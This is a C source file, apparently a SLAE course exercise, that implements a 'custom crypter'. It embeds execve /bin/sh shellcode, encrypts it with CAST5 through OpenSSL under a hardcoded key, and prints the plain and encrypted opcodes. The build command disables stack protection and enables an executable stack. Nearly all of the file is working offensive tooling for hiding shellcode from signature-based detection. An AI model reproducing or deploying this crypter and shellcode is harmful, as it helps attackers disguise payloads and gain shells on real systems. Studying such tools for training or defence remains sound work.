/*
 * Title: Custom Crypter CAST5
 * Platform: linux/x86
 * Date: 2015-01-18
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
 *
 * $ gcc -Wl,-z,execstack -fno-stack-protector \
 * 	custom_crypter-cast5.c -o custom_crypter-cast5 -lcrypto
*/
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

#define KEY	"oXz19zT6w4GV8vtHcqx982T6O167xHAZ"
#define IV	"sh0Q4LaXUboBQMjAX"

/*
 * execve "/bin/sh" shellcode - 22 byte
*/
unsigned char *shellcode =
	"\x6a\x0b\x58\x31\xc9\x51\x68\x2f"
	"\x2f\x73\x68\x68\x2f\x62\x69\x6e"
	"\x89\xe3\x89\xca\xcd\x80";

void
print_opcode(unsigned char *shellcode)
{
	size_t len = strlen(shellcode);
	size_t counter = 0;

	for (int i = 0; i < len; i++) {
		if (counter == 7) {
			printf("\\x%02x\n", *(shellcode + i));
			counter = 0;
		} else {
			printf("\\x%02x", *(shellcode + i));
			counter++;
		}
	}
	printf("\n\n");
}

void
handleErrors(void)
{
	ERR_print_errors_fp(stderr);
	abort();
}

int
encrypt(unsigned char *plaintext, int plaintext_len,
		unsigned char *key, unsigned char *iv,
		unsigned char *ciphertext)
{
	EVP_CIPHER_CTX *ctx;
	int ciphertext_len;
	int len;

	/* Create and initialise the context */
	if(!(ctx = EVP_CIPHER_CTX_new()))
		handleErrors();

	/* Initialise the encryption operation. */
	if(1 != EVP_EncryptInit_ex(ctx, EVP_cast5_ecb(),
				NULL, key, iv))
		handleErrors();

	/*
	 * Provide the message to be encrypted, and
	 * obtain the encrypted output.
	*/
	if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len,
				plaintext, plaintext_len))
		handleErrors();

	ciphertext_len = len;

	/*
	 * Finalise the encryption. Further ciphertext
	 * bytes may be written at this stage.
	*/
	if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
		handleErrors();

	ciphertext_len += len;

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	return ciphertext_len;
}

int
main (void)
{
	unsigned char *key = KEY; /* A 256 bit key */
	unsigned char *iv = IV;   /* A 128 bit IV */

	/* Buffer for ciphertext. */
	unsigned char ciphertext[128];
	int ciphertext_len;

	/* Initialise the library */
	ERR_load_crypto_strings();
	OpenSSL_add_all_algorithms();
	OPENSSL_config(NULL);

	/* Encrypt the plaintext */
	ciphertext_len = encrypt(shellcode, strlen(shellcode),
			key, iv, ciphertext);

	printf("[+] Plain shellcode is:\n");
	print_opcode(shellcode);

	printf("[+] Encrypted shellcode is:\n");
	print_opcode(ciphertext);

	/* Clean up */
	EVP_cleanup();
	ERR_free_strings();

	return 0;
}
